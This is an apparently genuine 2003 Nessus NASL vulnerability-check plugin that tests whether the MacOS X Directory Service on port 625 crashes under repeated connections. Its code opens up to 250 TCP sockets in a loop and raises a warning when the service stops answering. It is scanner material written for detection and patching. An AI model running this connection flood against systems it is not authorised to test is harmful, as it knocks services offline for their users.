#
# This script was written by Renaud Deraison
#
# See the Nessus Scripts License for details
#
#
if(description)
{
 script_id(11603);
 script_bugtraq_id(7323);
 script_version ("$Revision: 1.4 $");
 
 name["english"] = "MacOS X Directory Service DoS";
 script_name(english:name["english"]);
 
desc["english"] = "
It was possible to disable the remote service (probably MacOS X's 
directory service) by making multiple connections to this port.

Solution : Uprade to MacOS X 10.2.5 or newer
Risk factor : Low";

 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes the remote MacOS X Directory Service";
 script_summary(english:summary["english"]);
 
 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(625);
 
 exit(0);
}

#
# The script code starts here
#

if (get_port_state(625))
{
 soc = open_sock_tcp(625);
 if(!soc)exit(0);
 
 for(i=0;i<250;i++)
 {
  soc = open_sock_tcp(625);
  if(!soc){ security_warning(port); exit(0); }
 }
}
